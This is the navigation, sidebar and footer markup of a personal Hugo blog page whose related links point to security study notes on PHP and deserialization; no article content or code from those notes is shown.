href=/relax/ title="Relaxxx page">Relaxxx</a></li><li class="px-1 md:px-0"><a href=/categories/ title="Categories page">Categories</a></li><li class="px-1 md:px-0"><a href=/series/ title="Series page">Series</a></li><li class="px-1 md:px-0"><a href=/tags/ title="Tags page">Tags</a></li><li class="px-1 md:px-0"><a href=/about/ title="About page">About</a></li><li class="px-1 md:px-0"><a href=/friends/ title="Friends page">Friends</a></li><li class="px-1 md:px-0"><a href=https://travellings.link title="Travelling page">Travelling</a></li><div id=fastSearch class=m-0><input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=V2VkIDI3IEFwcmlsIDIwMjIgMTE6MzM6MTUgVVRD target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/7562434112 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 3825 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2021/11/29/php-session-study-notes/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>PHP_Session学习笔记</a>
<a class=flex-grow-0 href=/2021/12/03/bypass-md5-or-sha1-compare/>md5比较常见绕过小结<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div><div class="font-serif pb-2 flex align-start leading-loose"><span class="heading pr-6 leading-loose">Related</span>
<span><a href=/2021/11/29/php-session-study-notes/>PHP_Session学习笔记</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/11/25/php-remote-debug-env-init/>PHP远程debug环境配置</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/11/18/attack-php-fpm-study-notes/>攻击PHP-FPM学习笔记</a>&nbsp;&nbsp;/&nbsp;
<a href=/2021/08/12/python-unserialize-notes-01-python/>反序列化专题笔记·壹·python篇</a></span></div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>